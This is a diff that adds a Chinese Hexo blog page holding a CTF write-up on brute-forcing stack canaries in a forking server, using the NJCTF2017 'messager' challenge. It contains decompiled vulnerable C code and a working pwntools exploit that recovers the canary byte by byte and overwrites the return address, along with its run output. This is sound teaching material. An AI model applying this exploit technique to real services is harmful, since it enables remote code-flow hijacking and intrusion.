@@ -1,0 +1,1235 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>Bypassing Canary——Brute force - Hexo</title>
+
+
+    <meta name="description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。">
+<meta name="keywords" content="CTF,pwn,Canary,StackOverflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypassing Canary——Brute force">
+<meta property="og:url" content="http://yoursite.com/2018/11/14/Bypassing Canary——Brute force/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/og_image.png">
+<meta property="og:updated_time" content="2019-08-22T06:32:11.754Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bypassing Canary——Brute force">
+<meta name="twitter:description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。">
+<meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
+
+
+
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+        <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="Bypassing Canary——Brute force" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+                <a class="navbar-item"
+                href="/about">关于</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-14T06:42:16.000Z">2018-11-14</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 894 个字)
+                </span>
+                
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span>次访问
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Bypassing Canary——Brute force
+            
+        </h1>
+        <div class="content">
+            <p>我们都一般来说，一个链接了标准库的文件都以<code>__libc_start_main</code>为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。<br><a id="more"></a></p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// glibc-2.29 -- csu/libc-start.c</span></span><br><span class="line"><span class="hljs-keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random)</span><br></pre></td></tr></table></figure>
+<p>也就是说Canary的值在程序一开始运行时就已经确定了。而对于典型的多进程并发服务器，程序统一由父进程来accept连接，然后fork子进程处理读写。子进程数据空间中的内容是父进程的完整拷贝，二者具有相同的Canary，这也让爆破Canary成为了可能。</p>
+<ul>
+<li>首先Canary第0位永远是0x00，这是为了防止Canary被打印出来做的截断。</li>
+<li>确定溢出长度后，在该长度基础上逐位增加一字节爆破，如果程序没有崩溃则说明该位正确</li>
+<li>一直跑出Canary的所有位，64位程序最多尝试7*256次，32位最多尝试3*256次</li>
+</ul>
+<p>下面来看具体的例子</p>
+<h2 id="NJCTF2017-messager"><a href="#NJCTF2017-messager" class="headerlink" title="NJCTF2017 messager"></a>NJCTF2017 messager</h2><p>checksec:</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> checksec messager</span></span><br><span class="line">[*] '/root/NJCTF2017/messager'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Snipaste_2019-08-21_10-37-37.png" alt></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA分析，我们可以得到第一个关键信息</p>
+<ul>
+<li>这是一个典型的多进程并发服务器</li>
+</ul>
+<p>结合上面checksec的结果，首先想到的应该就是想办法爆破Canary。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = accept(sock, &amp;sock_addr, &amp;addr_len);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( fd == <span class="hljs-number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="hljs-string">"accept"</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    send(fd, <span class="hljs-string">"Welcome!\n"</span>, <span class="hljs-number">9u</span>LL, <span class="hljs-number">0</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="hljs-keyword">if</span> ( pid == <span class="hljs-number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="hljs-string">"fork"</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !pid )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    close(fd);</span><br><span class="line">  &#125;</span><br><span class="line">  signal(<span class="hljs-number">14</span>, (<span class="hljs-keyword">__sighandler_t</span>)handler);</span><br><span class="line">  alarm(<span class="hljs-number">3u</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)handle_message() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( send(fd, <span class="hljs-string">"Message receive failed\n"</span>, <span class="hljs-number">0x19</span>uLL, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="hljs-string">"send"</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( send(fd, <span class="hljs-string">"Message received!\n"</span>, <span class="hljs-number">0x12</span>uLL, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="hljs-string">"send"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进一步查看处理连接的函数<code>handle_message()</code>，可以得到另外两个关键信息：</p>
+<ul>
+<li>Canary在rbp-0x8处</li>
+<li>读取用户输入时存在一个栈溢漏洞，需要填充的空间大小为0x78-0x10=0x68字节</li>
+</ul>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">signed</span> __<span class="hljs-function">int64 <span class="hljs-title">handle_message</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 result; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 canary; <span class="hljs-comment">// [rsp+78h] [rbp-8h]       //canary位于rbp-0x8</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"csfd = %d\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)fd);</span><br><span class="line">  bzero(&amp;s, <span class="hljs-number">0x64</span>uLL);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)recv(fd, &amp;s, <span class="hljs-number">0x400</span>uLL, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span> ) <span class="hljs-comment">//s的大小只有0x68字节</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="hljs-string">"recv"</span>);</span><br><span class="line">    result = <span class="hljs-number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Message come: %s"</span>, &amp;s);</span><br><span class="line">    fflush(<span class="hljs-built_in">stdout</span>);</span><br><span class="line">    result = <span class="hljs-number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再检查剩下的几个函数，函数<code>sub_400b76()</code>将打开文件flag并将内容写入bss中：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ssize_t</span> read_flag()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="hljs-string">"./flag"</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="hljs-string">"open flag failed"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">return</span> read(fd, &amp;flag, <span class="hljs-number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数<code>sub_400bc6()</code>向fd中发送flag，这里重命名为<code>send_flag()</code>。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ssize_t</span> sned_flag()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="hljs-keyword">return</span> send(fd, &amp;flag, <span class="hljs-number">0x64</span>uLL, <span class="hljs-number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因此利用思路就可以确定如下，结合上面静态分析得到的信息，甚至不用调试</p>
+<ol>
+<li>逐字节爆破Canary</li>
+<li>已用栈溢出覆盖返回地址</li>
+<li>在溢出数据恰当的偏移处填上爆破出的Canary</li>
+<li>将返回地址覆盖为sned_flag()的地址</li>
+</ol>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'WARN'</span></span><br><span class="line"></span><br><span class="line">send_flag = p64(<span class="hljs-number">0x400bc6</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># leak Canary</span></span><br><span class="line">canary = <span class="hljs-string">"\x00"</span>				<span class="hljs-comment">#Canary的最低位为0x00</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">256</span>):</span><br><span class="line">        p = remote(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">5555</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.send(<span class="hljs-string">"A"</span>*<span class="hljs-number">0x68</span>+canary+chr(y))</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            p.recv()</span><br><span class="line">        <span class="hljs-keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    canary += chr(y)</span><br><span class="line">    print(<span class="hljs-string">"[*] Canary byte "</span> + str(x+<span class="hljs-number">1</span>) +<span class="hljs-string">": "</span> + hex(y))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">5555</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="hljs-string">"A"</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">"A"</span>*<span class="hljs-number">8</span>+send_flag)</span><br><span class="line">flag = p.recv()</span><br><span class="line">p.close()</span><br><span class="line">print(<span class="hljs-string">'[+] flag is:'</span> + flag)</span><br></pre></td></tr></table></figure>
+<p>Exp运行结果：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./exp.py</span><br><span class="line">[*] Canary byte 1: 0x10</span><br><span class="line">[*] Canary byte 2: 0x30</span><br><span class="line">[*] Canary byte 3: 0xe4</span><br><span class="line">[*] Canary byte 4: 0x8c</span><br><span class="line">[*] Canary byte 5: 0x87</span><br><span class="line">[*] Canary byte 6: 0x2</span><br><span class="line">[*] Canary byte 7: 0x19</span><br><span class="line">[+] flag is:flag&#123;This is flag&#125;</span><br></pre></td></tr></table></figure>
+
+        </div>
+        <!-- 文章结尾添加版权声明 从这里开始 -->
+        
+        <ul class="post-copyright">
+        <li><strong>本文标题：</strong><a href="http://yoursite.com/2018/11/14/Bypassing Canary——Brute force/">Bypassing Canary——Brute force</a></li>
+        <li><strong>本文作者：</strong><a href="http://yoursite.com">John Doe</a></li>
+        <!-- <li><strong>本文链接：</strong><a href="http://yoursite.com/2018/11/14/Bypassing Canary——Brute force/">http://yoursite.com/2018/11/14/Bypassing Canary——Brute force/</a></li> -->
+        <li><strong>发布时间：</strong>2018-11-14</li>
+        <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
+        </ul>
+        
+        <!-- 文章结尾添加版权声明 到这里结束 -->
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CTF/">CTF</a>, <a class="has-link-grey -link" href="/tags/Canary/">Canary</a>, <a class="has-link-grey -link" href="/tags/StackOverflow/">StackOverflow</a>, <a class="has-link-grey -link" href="/tags/pwn/">pwn</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<div class="notification is-danger">
+    You forgot to set the <code>qrcode</code> for Alipay. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                
+<div class="notification is-danger">
+    You forgot to set the <code>qrcode</code> for Wechat. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->
+
+<div class="notification is-danger">
+    You forgot to set the <code>business</code> and <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                
+<div class="notification is-danger">
+    You forgot to set the <code>url</code> Patreon. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/11/15/Bypassing Canary——Override Canary in TLS/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">Bypassing Canary——hijack __stack_chk_fail</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2018/11/14/Bypassing Canary——Leak Canary/">
+                <span class="level-item">Bypassing Canary——Leak Canary</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left is-sticky">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                        <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Your name">
+                    
+                    
+                    <p class="is-size-4 is-block">
+                        Your name
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Your title
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Your location</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        9
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        12
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/ppoffice" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/ppoffice">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Instagram" href="https://www.instagram.com">
+                
+                <i class="fab fa-instagram"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">6</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/漏洞分析/">
+            <span class="level-start">
+                <span class="level-item">漏洞分析</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Canary/" style="font-size: 16.67px;">Canary</a> <a href="/tags/Fortigate/" style="font-size: 10px;">Fortigate</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/MISC/" style="font-size: 10px;">MISC</a> <a href="/tags/StackOverflow/" style="font-size: 16.67px;">StackOverflow</a> <a href="/tags/Steganalysis/" style="font-size: 10px;">Steganalysis</a> <a href="/tags/ghostscrpt/" style="font-size: 10px;">ghostscrpt</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/漏洞/" style="font-size: 13.33px;">漏洞</a> <a href="/tags/网络设备/" style="font-size: 10px;">网络设备</a> <a href="/tags/防火墙/" style="font-size: 10px;">防火墙</a>
+    </div>
+</div>
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen is-sticky">
+        
+            
+<div class="card widget" id="toc">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                目录
+            </h3>
+            <ul class="menu-list"><li>
+        <a class="is-flex" href="#NJCTF2017-messager">
+        <span class="has-mr-6">1</span>
+        <span>NJCTF2017 messager</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#分析">
+        <span class="has-mr-6">1.1</span>
+        <span>分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#利用">
+        <span class="has-mr-6">1.2</span>
+        <span>利用</span>
+        </a></li></ul></li></ul>
+        </div>
+    </div>
+</div>
+
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/07/03/ghostscrpt/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png" alt="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
+                    <a href="/2019/07/03/ghostscrpt/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CVE-2018-16509：Ghostscrpt沙箱绕过漏洞</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/漏洞分析/">漏洞分析</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/07/03/hello-world/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Hello World">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
+                    <a href="/2019/07/03/hello-world/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Hello World</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/16/Bypassing Canary——SSP Leak/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Bypassing Canary——SSP Leak">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-16T05:05:12.000Z">2018-11-16</time></div>
+                    <a href="/2018/11/16/Bypassing Canary——SSP Leak/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Bypassing Canary——SSP Leak</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/15/Bypassing Canary——hijack __stack_chk_fail/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Bypassing Canary——hijack __stack_chk_fail">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-15T09:05:12.000Z">2018-11-15</time></div>
+                    <a href="/2018/11/15/Bypassing Canary——hijack __stack_chk_fail/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Bypassing Canary——hijack __stack_chk_fail</a>
